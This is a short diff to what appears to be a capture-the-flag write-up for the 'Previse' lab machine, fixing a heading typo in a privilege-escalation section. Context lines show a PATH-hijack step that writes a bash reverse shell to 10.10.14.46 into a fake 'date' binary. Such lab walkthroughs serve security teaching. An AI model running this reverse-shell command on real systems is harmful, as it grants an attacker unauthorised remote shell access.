@@ -263,7 +263,7 @@ User m4lwhere may run the following commands on previse:
 
 > chmod +x gzip
 
-- Data approach
+- Date approach
 
 > echo "bash -c 'bash -i &> /dev/tcp/10.10.14.46/*port* 0<&1'" > date
 
